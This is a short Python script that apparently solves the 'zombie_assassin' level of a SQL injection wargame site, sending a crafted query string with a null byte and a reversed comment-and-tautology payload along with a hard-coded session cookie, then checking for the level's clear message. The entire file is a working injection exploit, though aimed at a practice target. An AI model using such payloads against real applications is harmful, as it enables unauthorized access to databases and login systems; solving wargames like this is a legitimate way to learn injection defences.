import requests

url="https://los.rubiya.kr/chall/zombie_assassin_eac7521e07fe5f298301a44b61ffeec0.php?"
cookie={'PHPSESSID':'pgsatqanllcknmpsej9756rtqq'}

def solve():
    query="id=%00&pw=%23%201=1%20ro"
    res = requests.get(url=url+query, cookies=cookie)
    if "ZOMBIE_ASSASSIN Clear!" in res.text:
        print("ZOMBIE ASSASSIN Clear!")

if __name__ == "__main__":
    solve()
